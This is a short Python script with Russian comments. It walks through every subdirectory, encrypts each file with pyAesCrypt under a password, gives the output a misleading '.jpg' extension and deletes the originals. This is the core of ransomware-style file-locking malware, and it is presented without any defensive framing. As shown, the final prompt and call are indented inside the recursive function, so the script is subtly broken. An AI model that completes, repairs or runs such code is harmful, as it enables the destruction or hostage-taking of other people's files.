import pyAesCrypt
import os

# функция шифрования
def encryption(file, password):
    # задаем размер буфера
    buffer_size = 512 * 1024

    # вызываем метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".jpg",
        password,
        buffer_size
    )

    # что бы видеть результат программы
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # удаляем исходный файл
    os.remove(file)

# функция сканирования директории
def walking_by_dirs(dir, password):

    # перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если находим файл , то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)

        # если находим директорию , то повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)

    password = input("Введите пароль для шифрования: ")
    walking_by_dirs("", password)


